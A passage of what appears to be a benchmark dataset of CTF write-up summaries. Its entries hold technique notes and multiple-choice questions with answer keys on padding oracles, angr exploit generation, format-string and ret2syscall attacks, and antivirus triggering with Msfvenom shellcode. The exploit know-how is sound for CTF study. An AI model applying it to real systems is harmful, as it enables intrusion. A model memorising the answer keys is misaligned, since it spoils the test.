        "name": "Advanced Reversing Mechanics 2",
        "write_up": "dataset/raw/Advanced Reversing Mechanics 2.md",
        "type": "The type of challenge in this write-up is **reverse**.",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 461,
        "max_score": 500,
        "difficulty": 0.922,
        "knowledge": [
            "When faced with an encrypted flag and a corresponding encryption function from a reversing challenge, a viable approach is to reverse-engineer the encryption logic. If direct reversal is complex or impractical, an alternative method involves using brute force to determine the original inputs that produce the given encrypted outputs. This technique applies broadly, regardless of the encryption algorithm's specifics, as long as the character set for potential inputs is manageable and known.",
            "For binary analysis and reversing tasks involving compiled code, tools like Ghidra can be used for decompilation to understand the algorithm's logic. This understanding can then be applied in coding a script that systematically tries each character in a known character set against the encryption function. This approach is suitable when encryption functions are too complex to invert logically or mathematically. This method's efficiency is significantly increased when the possible character set is limited and well-defined, as is often the case in CTF challenges involving textual flags.\n\nSample payload (conceptual illustration rather than specific code):\n\n```c\nfor each character in flag:\n  for each possible character in known character set:\n    if encrypt(possible character) == encrypted character:\n      append possible character to decrypted flag\nprint decrypted flag\n```"
        ],
        "question": [
            "In a cybersecurity challenge focusing on reversing encrypted flags, you have an encryption function `encryptFlag()` that performs complex transformations on input characters. To decrypt an encrypted message, you consider implementing a brute-force script. Which of the following best describes the approach to decrypt each character of the encrypted message? - A. Reverse the encryption algorithm to directly compute the decrypt function. - B. Use a hash table to map every possible encrypted character back to its original character. - C. For each encrypted character, iterate over a known set of printable characters, apply the `encryptFlag()` function, and compare the output with the encrypted character until a match is found. - D. Implement a machine learning model to predict the decryption key based on the encrypted message.",
            "When decompiling binary code in a cybersecurity challenge to understand an encryption algorithm, which tool can be used to obtain a higher-level understanding of the involved functions, aiding in the development of a decryption script? - A. Microsoft Excel - B. Adobe Photoshop - C. Ghidra - D. Adobe Premiere"
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "AEG",
        "write_up": "dataset/raw/AEG.md",
        "type": "reverse",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 992,
        "max_score": 1000,
        "difficulty": 0.992,
        "knowledge": [
            "When facing a dynamically generated binary with a buffer overflow vulnerability and complex input encoding functions, **angr** can be utilized to automatically generate an exploit by symbolically executing the binary until an unconstrained state is reached. This signifies control over the instruction pointer, allowing determination of input that directs execution to a desired function, such as a win function in CTF challenges.",
            "To interact with a binary that processes encoded input, creating a symbolic payload with constraints that lead to the execution of a specific function (e.g., a win function) can be an effective strategy. This involves using a symbolic execution engine like **angr** to reverse the encoding process and solve for the original input that, when processed by the binary's encoding functions, results in the intended exploitation. This method is particularly useful in automated exploit generation (AEG) scenarios where direct analysis of the encoding functions is impractical.\n\nSample script snippet to create payload:\n```python\nwin = proj.loader.find_symbol(\"win\")\nexp.add_constraints(exp.regs.pc == win.linked_addr)\npayload_real = exp.solver.eval(payload_ast, cast_to=bytes)\n```\nThis code finds the address of the win function, constrains the instruction pointer to this address, and solves for the payload that achieves this state."
        ],
        "question": [
            "In the context of using angr for solving a binary exploitation challenge, which statement best describes the next step after identifying an unconstrained state indicating control over the instruction pointer?  - A. Disable all angr constraints to maximize payload effectiveness. - B. Set the instruction pointer to a random value in hopes of hitting the win function. - C. Manually reverse the encoding functions applied to input before passing it to angr for analysis. - D. Use angr's solver to find input that sets the instruction pointer to the address of a specific function such as `win`. ",
            "When automatically generating an exploit for a binary with a buffer overflow and input encoding using angr, which step is essential for creating a successful payload?  - A. Adding constraints to the payload that prevent it from altering the binary's execution flow. - B. Manually decoding the input before feeding it into angr to ensure accurate symbolic execution. - C. Using angr's solver to solve for a payload that directs the execution to a predefined function address, like the win function. - D. Removing all symbolic variables from the payload to avoid detection by the binary's security mechanisms. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "AESy",
        "write_up": "dataset/raw/AESy.md",
        "type": "crypto",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 471,
        "max_score": 500,
        "difficulty": 0.942,
        "knowledge": [
            "To exploit CBC (Cipher Block Chaining) mode encryption vulnerabilities, particularly padding oracle attacks, identify the presence of such vulnerabilities by observing the system's response to manipulated ciphertext. A valid manipulation that aligns with the expected padding after decryption (resulting in a distinct server response) confirms the potential to perform a padding oracle attack. This method requires knowing or guessing the encryption scheme (CBC in this case) and observing the system's differential responses to valid versus manipulated or invalid messages.\n\n   - Example manipulation for confirming CBC padding oracle vulnerability: Encrypt a known plaintext (e.g., 'aaaaaaa'), which after hex-encoding becomes 14 bytes, expecting padding to complete the block. Manipulate (flip) the last byte of what is presumed to be the Initialization Vector (IV) to alter the expected padding byte in the decrypted plaintext. A server response indicating success (`!`) versus failure (`?`) can confirm the existence of a CBC padding oracle.",
            "Implement an oracle function in programming (e.g., Python) that interacts with the vulnerable system by sending manipulated ciphertexts and observing the responses. This oracle function is essential for automated exploitation of padding oracle attacks, enabling the decryption of ciphertexts without direct access to the encryption key. Through iterative manipulation and observation, this process gradually reveals the plaintext corresponding to a given ciphertext.\n\n   - In the context of the challenge, the oracle function sends manipulated ciphertext to a server and interprets the received response to determine if the padding was valid. Successful implementation of such an oracle enables automated recovery of plaintext data, including encrypted flags or sensitive information, from the ciphertexts provided by the system."
        ],
        "question": [
            "To confirm the presence of a CBC padding oracle vulnerability in a system that encrypts messages, which of the following manipulations should you perform on the ciphertext? - A. Encrypt a plaintext and append an extra block of random bytes before sending it to the server. - B. Encrypt a plaintext and then alter the middle byte of the ciphertext before submitting it to the server. - C. Encrypt a plaintext such as 'aaaaaaa', hex-encode it to obtain a 14-byte ciphertext, and then flip the last byte of the first block to alter the expected padding byte upon decryption. - D. Encrypt the plaintext, remove the last block of the ciphertext, and then submit it to the server to observe the response. ",
            "In the context of exploiting a CBC padding oracle vulnerability with a Python script, what is the primary purpose of the oracle function? - A. The oracle function sends a series of random ciphertexts to the server to generate a wide range of error messages for analysis. - B. The oracle function submits manipulated ciphertexts to the server and returns true if the server's response indicates valid padding, facilitating automated plaintext recovery. - C. The oracle function calculates the correct padding for any given plaintext and sends this information along with the ciphertext to the server. - D. The oracle function decrypts the ciphertext locally without interacting with the server, bypassing the padding oracle vulnerability altogether. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Algorithm",
        "write_up": "dataset/raw/Algorithm.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a reverse engineering challenge involving a binary that utilizes standard library data structures heavily (e.g., `std::vector`, `std::map`, `std::set`, etc.), one efficient strategy is to identify patterns of C++ code in decompilation output to quickly understand complex data interactions. This approach focuses on recognizing generic patterns like scope resolution (`::` for accessing standard library functionalities), operator overloading (`operator<<`, `operator>>` for I/O operations), and iterators (`begin()`, `end()`, and `operator++` for traversing containers) to decipher algorithm logic without getting bogged down in template or syntactic complexities. This method is applicable in scenarios where the binary's use of C++ STL containers significantly influences the program's behavior or its data processing logic.",
            "In CTF challenges where the task involves inputting data to form a graph that is subsequently processed by an algorithm within a binary, understanding the algorithm's goal and the structure it expects can be crucial. If the binary implements a graph algorithm, such as Breadth-First Search (BFS), providing input that meets the algorithm's expected conditions can lead to a successful exploit. For instance, if the algorithm requires a specific graph structure (like a linear graph where the nodes are visited in a particular order) to return a successful result, constructing input that mirrors this structure will satisfy the algorithm's conditions, possibly revealing hidden data or flags. In challenges where the constraints include node connectivity and specific traversal orders, constructing an adjacency list representation that meets these requirements is key. \n   \n   Example input for a linear graph structure to satisfy a BFS algorithm expecting nodes in increasing order:\n   ```\n   5\n   4 5\n   5 6\n   6 7\n   7 8\n   8 9\n   ```"
        ],
        "question": [
            "In the context of reverse engineering a C++ binary with heavy usage of STL containers, which decompilation approach is most helpful in understanding the complex data interactions? - A. Focusing on recognizing high-level programming constructs such as loops and conditionals only. - B. Ignoring the use of STL containers and focusing solely on primitive data types like integers and characters. - C. Identifying generic patterns like scope resolution, operator overloading, and iterators to understand algorithm logic. - D. Concentrating exclusively on template specifications and ignoring their actual usage in the binary. ",
            "When presented with a binary that processes input data to simulate a graph-based algorithm, which strategy is essential for exploiting the binary to uncover hidden information or flags? - A. Providing random pairs of numbers irrespective of the algorithm's expected conditions. - B. Ignoring the order of nodes and edges, focusing instead on the volume of input data. - C. Constructing input that forms a random graph structure, assuming the algorithm can process any graph type. - D. Constructing input that mirrors the graph structure expected by the algorithm, such as a specific sequence of nodes and edges to satisfy conditions like traversal order. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Alice & Bob Flip a Bit Easy",
        "write_up": "dataset/raw/Alice & Bob Flip a Bit Easy.md",
        "type": "This write-up describes a reverse challenge.",
        "competition": [
            "FE-CTF/2023",
            "https://ctftime.org/event/1979/tasks/"
        ],
        "score": 0.33,
        "max_score": 1,
        "difficulty": 0.33,
        "knowledge": [
            "When encoding data with a constraint on the maximum allowed number of bits (encoding space) and the need to ensure data integrity against single-bit errors, a method is to use error-correction techniques that utilize redundancy and special hash functions. Especially, when the encoding space closely matches the size of the data, techniques such as triplicating each bit and using majority voting for decoding or designing a custom hash function that maps data bits to a smaller space (while ensuring that any single bit flip can be detected and corrected) are effective. \n\n   - For triplication and majority voting:\n     ```python\n     def alice(args):\n         return [bool(int(c)) for b in args for c in format(b, '08b')]*3\n\n     def bob(args):\n         return bytes(int(''.join(str(int(sum(args[i:i+3])/2)) for i in range(0, len(args), 3)), 2) for _ in range(0, len(args), 24))\n     ```\n   \n   - For custom hash function with bit mapping and correction:\n     ```python\n     def alice(args):\n         # Imagine args is a byte array needing encoding\n         # Encode args to a list with exactly 513 bits, utilizing a custom hash function\n         pass  # The implementation would depend on the chosen hash function and mapping\n\n     def bob(args):\n         # Decode the bit list back to the original byte array, correcting the single bit error\n         pass  # Specific decoding logic utilizing the inverse of the hash function and mapping\n     ```",
            "When leveraging Hamming codes for error detection and correction, the use of additional information such as a boolean flag indicating if correction was needed can optimize the encoding/decoding process. This allows for the transmission of slightly more data than the Hamming code would normally allow by enabling the detection of errors outside the normally protected area. This can be applied when you have a very tight constraint on encoding space and need to maximize data throughput within those bounds.\n\n   - Sketch of leveraging Hamming code with an extra boolean for data transmission:\n     ```python\n     def alice(msg):\n         # Encode msg up to 502 bits using Hamming, plus two extra bits outside Hamming's protection.\n         pass  # Implement the encoding including the extra bits and Hamming encoding for the rest.\n\n     def bob(msg):\n         # Decode the message, checking the extra boolean to correct a bit flip outside the Hamming protected area.\n         pass  # Use Hamming decoding, then correct the message based on the status of the extra boolean.\n     ```"
        ],
        "question": [
            "When implementing a custom encoded-decoding mechanism where the original message needs to be recovered despite a single bit flip, what technique can be used effectively when there's a strict limit on the maximum number of encoding bits?  - A. Compress the original message using a standard compression algorithm to fit within the limit without applying any form of error correction. - B. Encode the message using a base64 encoding scheme to ensure that it fits within the specified bit limit. - C. Triplicate each data bit and use majority voting for decoding to correct a single bit error. - D. Increase the number of bits per original data bit arbitrarily without considering the encoding space limit. ",
            "In scenarios where you're tasked with transmitting data with minimal encoding space and need to ensure error correction for a known fact of exactly one bit flip, how can leveraging additional information beyond traditional error correction methods be beneficial?  - A. Implement encryption using symmetric keys for each bit to prevent any bit flip from being recognized. - B. Use a lossless compression technique that inherently corrects single-bit errors without additional information. - C. Utilize a boolean flag from a decoder to identify if a correction was applied, allowing handling of errors beyond the normally protected area by the Hamming code. - D. Encode all data into a single-byte representation, assuming no errors will occur during transmission. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Alphabet",
        "write_up": "dataset/raw/Alphabet.md",
        "type": "The type of this CTF challenge is `misc`.",
        "competition": [
            "FireShell/2020",
            "https://ctftime.org/event/944/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge involving hashed strings, especially when the hashes represent characters or sets of characters, one effective approach is to pre-generate the hashes of all possible characters (including alphanumeric characters and special symbols). This allows for a quick lookup to reverse the hashes back to their original characters. This technique is useful not only for MD5 and SHA256 hashes but can be adapted for other hashing algorithms as well. \n    - Example payload generation snippet (for MD5 and SHA256):\n        ```perl\n        use Digest::SHA qw(sha256_hex);  \n        use Digest::MD5 qw(md5_hex);\n        my @chars = (\"a\"..\"z\", \"A\"..\"Z\", 0..9, qw(_ , . - { } [ ] ! @ # $ % ^ & * : ; '));\n        my %md5;  \n        my %sha256;\n        for(my $i=0; $i<=$#chars; $i++){  \n         $md5{md5_hex($chars[$i])} = $chars[$i];  \n         $sha256{sha256_hex($chars[$i])} = $chars[$i];  \n        }\n        ```",
            "For CTF challenges where the flag is hidden within a large block of text, after extracting meaningful data (e.g., converting hashes back to text), regular expressions can be utilized to search for the flag pattern. This is particularly useful when the flag follows a known format, which is common in many CTF competitions.\n    - Example regular expression usage to find a flag in the format `F#{...}`:\n        ```perl\n        perl -nE 'say $1 if /(F#{\\w+})/'\n        ```"
        ],
        "question": [
            "When developing a script to reverse hash values back to characters, how should you best organize your hash table based on this scenario of pre-generating hashes for both MD5 and SHA256 algorithms? - A. Store each character's hash under a combined MD5 and SHA256 key, merging both types into a single hash table for lookup. - B. Create separate hash tables for MD5 and SHA256, indexing hashes directly to their respective characters for quick reverse lookup. - C. Compile MD5 hashes into an array and SHA256 hashes into another, then search each array linearly for every hash encountered. - D. Concatenate all characters into a single string and use a single hash function to generate an inclusive hash map.",
            "In the context of extracting a specific pattern from a large body of text, considering that the pattern for the flag is well-defined, which Perl command exemplifies the correct use of a regular expression to capture and display a flag pattern like `F#{...}`? - A. perl -ne 'print $1 if /F#{.+?}/' - B. perl -nE 'say $1 if /(F#\\[\\w+\\])/' - C. perl -nE 'say $1 if /(F#{\\w+})/' - D. perl -pE 's/(F#{\\d+})/\\1/'"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "angrme",
        "write_up": "dataset/raw/angrme.md",
        "type": "reverse",
        "competition": [
            "HXP/2018",
            "https://ctftime.org/event/647/tasks/"
        ],
        "score": 50,
        "max_score": 412,
        "difficulty": 0.12135922330097088,
        "knowledge": [
            "When working with binary challenges, especially those hinting towards the usage of symbolic execution or when directly suggested, the angr framework presents a powerful tool for automating the exploration of binary paths to discover specific outcomes (e.g., finding a happy path marked by a specific output like \":)\"). An initial setup involves importing angr, setting up a project with the target binary, and leveraging the `simgr.explore()` function to search for the desired state. This approach is particularly beneficial in binaries with bifurcating paths leading to different outputs indicating success or failure states. \n   Example setup:\n   ```python\n   import angr\n   proj = angr.Project('binary_name')\n   simgr = proj.factory.simgr()\n   simgr.explore(find=lambda s: b\"desired_output\" in s.posix.dumps(1))\n   ```",
            "In scenarios where the immediate goal is to extract outputs or inputs relevant to succeeding in the challenge (e.g., extracting the flag), one can use the `simgr.found[0].posix.dumps(0)` or `simgr.found[0].posix.dumps(1)` after successfully finding the desired state with `simgr.explore()`. This method directly accesses the standard input or output related to the found state, allowing for the extraction of data that led to or resulted from the successful execution path. This process is invaluable when the challenge involves understanding the specific inputs or conditions leading to a successful binary execution outcome, such as reaching a winning message or code execution path.\n   Example command to get output:\n   ```python\n   s = simgr.found[0]\n   print(s.posix.dumps(1)) # For stdout data\n   ```"
        ],
        "question": [
            "When attempting to solve a binary analysis challenge that hints at the use of symbolic execution, one popular tool that comes into play is the \"angr\" framework. In the provided scenario, the objective is to use angr to find a path in a binary that leads to the output \":)\". Which of the following code snippets correctly initiates the angr project and sets up the search for the desired state?  - A. ```python import angr proj = angr.Project('binary_name') simgr = proj.factory.simmgr() simgr.run(until=lambda s: b\":)\" in s.posix.dumps(1)) ``` - B. ```python import angr proj = angr.Project('angrme') simgr = proj.factory.simgr() simgr.execute(find=lambda s: b\":)\" in s.posix.dumps(1)) ``` - C. ```python import angr proj = angr.Project('binary_name') simgr = proj.factory.simgr() simgr.search(find=lambda s: b\":)\" in s.posix.dumps(1)) ``` - D. ```python import angr proj = angr.Project('angrme') simgr = proj.factory.simgr() simgr.explore(find=lambda s: b\":)\" in s.posix.dumps(1)) ```",
            "In a binary analysis challenge, after successfully using the symbolic execution framework \"angr\" to find the state leading to a happy path characterized by the output \":)\", the next step involves retrieving the output or input that resulted in this successful execution. Based on the approach mentioned in the provided scenario, which command retrieves the standard output related to the found state?  - A. ```python s = simgr.found[0] print(s.memory.dumps(1)) ``` - B. ```python s = simgr.found[0] print(s.storage.dumps(1)) ``` - C. ```python s = simgr.found[0] print(s.posix.dumps(1)) ``` - D. ```python s = simgr.found[0] print(s.data.dumps(1)) ```"
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "Angry Defender",
        "write_up": "dataset/raw/Angry Defender.md",
        "type": "reverse",
        "competition": [
            "CONFidence/2020/Quals",
            "https://ctftime.org/event/960/tasks/"
        ],
        "score": 448,
        "max_score": 476,
        "difficulty": 0.9411764705882353,
        "knowledge": [
            "When dealing with antivirus evasion in a CTF challenge where the task involves interacting with an application monitored by an antivirus, common shellcodes used for exploitation (for example, those generated by tools like Msfvenom) can be utilized to trigger an antivirus detection. This can be specifically helpful when the application appends a flag to an executable file, and the execution of a shellcode can result in the antivirus deleting the file, thus serving as an implicit signal (e.g., deletion oracle) for detecting specific conditions (like the presence of a flag). This technique leverages the fact that antivirus systems often incorporate x86 emulators to scan new executables for known malicious patterns. Example shellcode snippet that could trigger an antivirus: \n\\[\n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\"\n\\]",
            "Optimization of executable payloads can significantly increase the efficiency of exploits, especially in environments with constrained resources or where rapid execution is necessary. In the context of crafting a custom payload for a CTF challenge, removing dependencies on the C runtime library (CRT) through linker options like `/NODEFAULTLIB` and setting the entry point directly to the `main` function can result in smaller and faster-executing binaries. This approach requires the manual management of code execution flow and memory protection mechanisms but allows for tighter control over the payload's behavior and interaction with the system. This knowledge is particularly applicable when creating custom payloads intended to operate under tight performance constraints or in heavily monitored environments."
        ],
        "question": [
            "In a CTF challenge focusing on antivirus evasion, leveraging the use of shellcodes from tools like Msfvenom can be effective for triggering antivirus detection due to their signatures being widely recognized by antivirus systems. Which of the following is an accurate reason for utilizing such shellcodes in an environment monitored by antivirus software?  - A. They ensure the encrypted data is safely transmitted over the network. - B. They trigger antivirus detection, acting as a signal for exploiting specific application behaviors, such as file deletion in response to threats. - C. They increase the performance and speed of the payload delivery system. - D. They encrypt the flag data making it undetectable by the antivirus software. ",
            "When optimizing executable payloads for a cybersecurity challenge, what is a crucial step for enhancing the execution efficiency of a custom payload designed for constrained or heavily monitored environments?  - A. Linking against all available system libraries to ensure maximum compatibility. - B. Removing unnecessary code and dependencies, such as the C runtime library, through specific linker options like `/NODEFAULTLIB` and setting the entry point directly to the main function. - C. Including multiple executable entry points to confuse the monitoring systems. - D. Dynamically allocating memory for all executable code to ensure efficient execution. "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Another Discord 100",
        "write_up": "dataset/raw/Another Discord 100.md",
        "type": "misc",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When participating in CTF challenges involving Discord, it is crucial to explore unconventional features or recent updates on the platform that might be used to hide information. For example, checking the details of ongoing events and the usage of text channels linked to voice channels could reveal parts of the flag.",
            "To extract information such as roles and channel names from a Discord server which might contain parts of the flag, leveraging Discord's API with appropriate authorization can be highly effective. Use curl commands with the Discord token for authorization to query the server's roles and channels. Ensure to replace `{guild.id}` with the actual server ID and insert the Discord token in place of `(discord token here)`.\n   \n   Example usage to fetch roles:\n   ```\n   curl -sH \"AUTHORIZATION: your_discord_token_here\" https://discordapp.com/api/v6/guilds/{guild.id}/roles\n   ```\n   \n   Example usage to fetch channels:\n   ```\n   curl -sH \"AUTHORIZATION: your_discord_token_here\" https://discordapp.com/api/v6/guilds/{guild.id}/channels\n   ```"
        ],
        "question": [
            "In a Capture the Flag challenge involving exploration of a Discord server, where would you most likely find a portion of the flag that is not immediately visible in text or voice channels? - A. In the server's main welcome message - B. In the details of an ongoing event within the server - C. Inside a pinned message in the general chat - D. Within the server's role descriptions",
            "When attempting to retrieve information such as roles or channel names from a Discord server for a CTF challenge, which of the following curl command formats is correct for querying the server's roles with the appropriate authorization? - A. `curl -sH \"AUTHORIZATION: Bearer your_discord_token_here\" https://discord.com/api/guilds/{guild.id}/roles` - B. `curl -sH \"API-KEY: your_discord_token_here\" https://discordapp.com/api/v8/guilds/{guild.id}/roles` - C. `curl -s \"AUTHORIZATION: your_discord_token_here\" https://discordapp.com/api/v6/guilds/{guild.id}/roles` - D. `curl -sH \"AUTHORIZATION: your_discord_token_here\" https://discordapp.com/api/v6/guilds/{guild.id}/roles`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Another ret to libc",
        "write_up": "dataset/raw/Another ret to libc.md",
        "type": "pwn",
        "competition": [
            "kksctf/2019",
            "https://ctftime.org/event/874/tasks/"
        ],
        "score": 997,
        "max_score": 1000,
        "difficulty": 0.997,
        "knowledge": [
            "In challenges involving heap-based buffer overflows and function pointer manipulation, exploiting a format string vulnerability can allow for arbitrary code execution. Specifically, when a format string vulnerability is present, an attacker can overwrite function pointers on the heap by carefully crafting the input to cause a buffer overflow. It is critical to calculate the exact number of bytes to overwrite the heap structure and then append the desired function addresses. A common strategy is to use a \"%n\" format specifier to write a certain number of bytes to a memory address, or in scenarios where direct memory address manipulation is not filtered, \"%s\" to leak memory content or addresses directly.",
            "Memory address leakage is essential for bypassing ASLR (Address Space Layout Randomization) in challenges where the memory space is randomized at each execution. This can be achieved by using format string vulnerabilities to leak addresses from the Global Offset Table (GOT). By leaking the address of a known function (e.g., `setbuf`) and calculating the offset to a target function (`system`), an attacker can precisely target functions in memory even without knowing their randomized addresses ahead of time. Tools such as readelf can be used offline to find the offsets between functions in the libc library being used.\n\nExample of leaking an address and calculating an offset:\n```python\nsetbuf = leakInt(0x0804a00c)  # Leak GOT entry of setbuf\nsystem = setbuf - 0x32f00  # Calculate address of system by subtracting offset\n```"
        ],
        "question": [
            "During a CTF challenge, you've identified a format string vulnerability that allows you to overwrite function pointers on the heap. Which of the following inputs correctly demonstrates the use of the format string vulnerability to overwrite existing function pointers with overflow strategies? Assume you want to overwrite 272 bytes of data structure to reach the function pointers. - A. `%0272x%hn` - B. `%0272x` followed by the address to overwrite the function pointer - C. `AAAA` directly followed by the new function addresses - D. `printf(\"%0272x\");` in the code to trigger the overflow",
            "In a scenario where you must bypass ASLR by leaking a memory address using a format string vulnerability, which of the following statements accurately reflects the steps to calculate the address of the `system` function after leaking the `setbuf` address from the GOT? - A. `system = setbuf + 0x32f00` - B. `setbuf = leakInt(0xdeadbeef)` to get the address of `system` - C. `system = setbuf - 0x32f00` after leaking `setbuf`'s address - D. Directly read the `system` address without any leaks"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Anti-Fermat",
        "write_up": "dataset/raw/Anti-Fermat.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2022",
            "https://ctftime.org/event/1555/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing RSA encryption challenges where non-standard methods are used to generate the primes $p$ and $q$, an understanding of how these primes relate to each other can reveal ways to factorize $n$. In this challenge, the key insight was that $q$ is the next prime after $p \\oplus ((1<<1024)-1)$. This relationship suggested that $p$ and $q$ are very close in value, making the Fermat's factorization method viable due to the approximation $p+q \\approx 1<<1024$. Knowing how $p$ and $q$ are chosen provides a significant hint towards factorizing $n$ by approximating $p$ and $q$ using properties of $n$ and the primes' generation method, eventually leading to the decryption of $c$.",
            "In scenarios involving RSA encryption with specially crafted prime generation algorithms, it's critical to explore algebraic manipulations and properties that can approximate or directly reveal $p$ and $q$. The realization that $p - (q^((1<<1024)-1)) - 1$ and $p + q - (1<<1024)$ are the same and small provides a direct method for attacking the cipher. By performing operations or manipulations that exploit the specific relationship between $p$ and $q$, such as using Fermat's approximation under the condition that $p$ and $q$ are very near to each other, attackers can efficiently factorize $n$. This strategy bypasses the need for brute-force attacks or extensive computational resources, making it a powerful approach for solving certain RSA challenges."
        ],
        "question": [
            "In an RSA encryption challenge, two prime numbers \\(p\\) and \\(q\\) are generated using a special method where \\(q\\) is the next prime after \\(p \\oplus ((1<<1024)-1)\\). Given this information, which factorization method is likely to be effective due to \\(p\\) and \\(q\\) being very close to each other, thus facilitating the decryption of \\(c\\)? - A. Elliptic Curve Factorization - B. Pollard's Rho Algorithm - C. Quadratic Sieve - D. Fermat's Factorization Method",
            "In an RSA challenge, it was noted that \\(p - (q^((1<<1024)-1)) - 1\\) and \\(p + q - (1<<1024)\\) are the same and both values are relatively small. What does this indicate about the effectiveness of certain cryptographic attacks, particularly in relation to factorizing \\(n\\) using knowledge of how \\(p\\) and \\(q\\) are related? - A. It suggests that differential cryptanalysis is particularly effective. - B. It implies that side-channel attacks are the most effective approach. - C. It indicates that Fermat's factorization method could be efficiently applied due to the special relation between \\(p\\) and \\(q\\). - D. It signals that linear cryptanalysis should be utilized to decrypt \\(c\\)."
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Anti-Libc",
        "write_up": "dataset/raw/Anti-Libc.md",
        "type": "pwn",
        "competition": [
            "BxMCTF/2023",
            "https://ctftime.org/event/2004/tasks/"
        ],
        "score": 458,
        "max_score": 458,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios where a binary is statically linked and lacks libc functions, making ret2libc infeasible, focusing on ret2syscall strategy becomes vital. The method involves crafting an exploit to execute a desired syscall; for instance, `execve(\"/bin/sh\", 0, 0)` for spawning a shell. This method requires precise manipulation of register values to set up the syscall arguments correctly. Registers RDI, RSI, and RDX need to be set to specific values (`/bin/sh` address in RDI, and 0 in both RSI and RDX) to successfully execute `execve`. Utilizing a buffer overflow to write the `/bin/sh` string to an executable segment like `.bss` and creatively using available gadgets to manipulate the values of RDI, RSI, and RDX are key steps.  \nExample payload component for setting RDI, RSI, RDX: Using a gadget `pop rsi; pop rdi; jmp ADDR` where `ADDR` performs actions that indirectly set RDX to the desired value, such as pointing RDI to a memory location containing `0x0`.",
            "When tools like `ROPgadget` or `ropper` do not yield gadgets necessary for manipulating a specific register (e.g., RAX for setting the `execve` syscall number), manually searching through the binary's disassembly might reveal usable instructions not identified by automated tools. This approach is crucial for finding ways to set up syscall numbers or other specific register values when standard gadgets are not available. Incorporating a found instruction sequence that indirectly allows setting the desired value in RAX (e.g., using `mov ebx, eax` in conjunction with a `pop rbx` to set RAX) demonstrates the importance of not solely relying on automated tools for exploit development.  \nExample payload component for setting RAX: `pop rbx; mov ebx, eax;` where RBX is set to the syscall number (`0x3b` for `execve`), and then moved to RAX."
        ],
        "question": [
            "In a scenario involving a ret2syscall attack where libc functions are absent, and direct manipulation of the `syscall` instruction is required, what is the proper order of actions to set up the syscall `execve(\"/bin/sh\", 0, 0)` using a buffer overflow and ROP gadgets? - A. Overflow the buffer to write `/bin/sh` to stack, use `pop rdx` to set RDX directly, and find a `syscall` gadget. - B. Write `/bin/sh` to `.bss` segment, use a `pop rsi; pop rdi; jmp ADDR` gadget that modifies RDI, RSI, and indirectly sets RDX, and execute `syscall`. - C. Directly write `execve` arguments to registers using `mov` instructions found via automated tools, and call `syscall`. - D. Overflow the buffer to corrupt return address directly to `execve` without setting up arguments or using syscalls.",
            "When attempting to manipulate the RAX register for a syscall number (e.g., `0x3b` for `execve`) in an exploit, but common gadget-finding tools fail to provide a direct method, what approach has been demonstrated as effective? - A. Solely rely on `ROPgadget` or `ropper` until they eventually find the needed gadget via updates. - B. Use a brute-force method to try all possible combinations of existing gadgets until the desired state is achieved. - C. Manually search through the binary disassembly to find instruction sequences like `mov ebx, eax` after setting RBX, to indirectly set RAX. - D. Rewrite the exploit in a high-level programming language to automate the process of finding the correct gadget."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "apl",
        "write_up": "dataset/raw/apl.md",
        "type": "The type of this CTF challenge is `misc`.",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When faced with an unfamiliar or obfuscated code snippet, especially in challenges tagged with programming or scripting languages like APL, it is beneficial to utilize online interpreters or compilers specific to the language in question to execute the code and analyze its output. Useful tools for this approach include https://tryapl.org/ for APL, among others for different languages. This strategy is particularly effective in deciphering obfuscated code that represents data or strings to be converted into readable format.",
            "Converting numerical arrays into readable text or characters by interpreting them as ASCII values is a common technique used to uncover hidden messages or flags in cybersecurity challenges. The conversion process typically involves identifying an array of numerical values in the challenge (which sometimes may be hidden or encoded in an obscure manner) and then translating these values according to the ASCII standard to retrieve the plaintext message or flag."
        ],
        "question": [
            "When analyzing an obfuscated script that contains a sequence of numbers generated by a specific coding language operation, which online tool can be effectively used for executing and understanding code written in APL? - A. http://compilejava.net/ - B. https://repl.it/languages/python3 - C. https://tryapl.org/ - D. https://jsfiddle.net/ ",
            "In the context of cybersecurity challenges, when given an array of numerical values that appear to be encoded or obscure, which process is typically used to translate these values into a readable string or flag? - A. Summing up all the numbers and converting the total to a binary code - B. Converting the numbers directly into hexadecimal values without any base transformation - C. Interpreting the numbers as ASCII values to retrieve the plaintext message or flag - D. Applying a complex cryptographic algorithm to decrypt the numbers "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "AppArmor2",
        "write_up": "dataset/raw/AppArmor2.md",
        "type": "The given write-up is for a **forensics** challenge.",
        "competition": [
